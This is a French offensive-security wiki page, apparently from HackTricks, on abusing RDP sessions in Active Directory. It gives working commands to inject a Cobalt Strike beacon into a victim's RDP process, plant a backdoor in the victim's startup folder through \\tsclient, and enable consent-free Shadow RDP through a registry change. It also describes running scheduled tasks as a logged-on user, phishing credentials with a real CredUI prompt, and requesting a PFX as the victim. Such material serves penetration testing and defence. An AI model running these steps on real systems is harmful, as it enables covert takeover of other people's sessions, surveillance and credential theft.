# Abus des sessions RDP

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Si le **groupe externe** dispose de **l'accès RDP** à n'importe quel **ordinateur** du domaine actuel, un **attaquant** pourrait **compromettre cet ordinateur et attendre que l'utilisateur s'y connecte**.

Une fois que cet utilisateur s'est connecté via RDP, **l'attaquant peut basculer vers la session de cet utilisateur** et abuser de ses permissions dans le domaine externe.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Consultez **d'autres façons de voler des sessions avec d'autres outils** [**in this page.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Si un utilisateur se connecte via **RDP into a machine** où un **attacker** est **waiting** pour lui, l'attaquant pourra **inject a beacon in the RDP session of the user** et si la **victim mounted his drive** lors de l'accès via RDP, le **attacker could access it**.

Dans ce cas, vous pourriez simplement **compromise** le **victims** **original computer** en écrivant une **backdoor** dans le **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Si vous êtes **local admin** sur un hôte où la victime a déjà une **active RDP session**, vous pouvez être en mesure de **view/control** ce bureau sans voler le **password** ni dumping **LSASS**.

Cela dépend de la politique **Remote Desktop Services shadowing** stockée dans:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Valeurs intéressantes :

- `0`: Désactivé
- `1`: `EnableInputNotify` (contrôle, approbation de l'utilisateur requise)
- `2`: `EnableInputNoNotify` (contrôle, **aucune approbation de l'utilisateur**)
- `3`: `EnableNoInputNotify` (lecture seule, approbation de l'utilisateur requise)
- `4`: `EnableNoInputNoNotify` (lecture seule, **aucune approbation de l'utilisateur**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Cela est particulièrement utile lorsqu'un utilisateur privilégié connecté via RDP a laissé un bureau déverrouillé, une session KeePass, une console MMC, une session de navigateur ou un shell administrateur ouverts.

## Scheduled Tasks As Logged-On User

Si vous êtes **local admin** et que l'utilisateur cible est **actuellement connecté**, Task Scheduler peut démarrer du code **en tant que cet utilisateur sans son mot de passe**.

Cela transforme la session de connexion existante de la victime en une primitive d'exécution :
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Remarques :

- Si l'utilisateur n'est **pas connecté**, Windows exige généralement le mot de passe pour créer une tâche qui s'exécute sous son compte.
- Si l'utilisateur **est connecté**, la tâche peut réutiliser le contexte de connexion existant.
- C'est un moyen pratique d'exécuter des actions GUI ou de lancer des binaires dans la session de la victime sans toucher à LSASS.

## Abus du prompt CredUI depuis la session de la victime

Une fois que vous pouvez exécuter **à l'intérieur du bureau interactif de la victime** (par exemple via **Shadow RDP** ou **a scheduled task running as that user**), vous pouvez afficher un **vrai Windows credential prompt** en utilisant les API CredUI et récupérer les identifiants saisis par la victime.

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Flux typique :

1. Lancer un binaire dans la session de la victime.
2. Afficher une invite d'authentification de domaine qui correspond à l'identité visuelle du domaine courant.
3. Extraire les données du buffer d'authentification renvoyé.
4. Valider les identifiants fournis et, éventuellement, continuer à afficher l'invite jusqu'à ce que des identifiants valides soient saisis.

Ceci est utile pour le **on-host phishing** car l'invite est affichée par les APIs Windows standard au lieu d'un faux formulaire HTML.

## Requesting a PFX In the Victim Context

La même primitive **scheduled-task-as-user** peut être utilisée pour demander un **certificate/PFX au nom de la victime connectée**. Ce certificat peut ensuite être utilisé pour **AD authentication** en tant que cet utilisateur, évitant complètement le vol du mot de passe.

Flux général :

1. Obtenir des privilèges **local admin** sur un hôte où la victime est connectée.
2. Exécuter la logique d'enrollment/export en tant que la victime en utilisant une **scheduled task**.
3. Exporter le **PFX** obtenu.
4. Utiliser le PFX pour PKINIT / certificate-based AD authentication.

Voir les pages AD CS pour les abus ultérieurs :

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
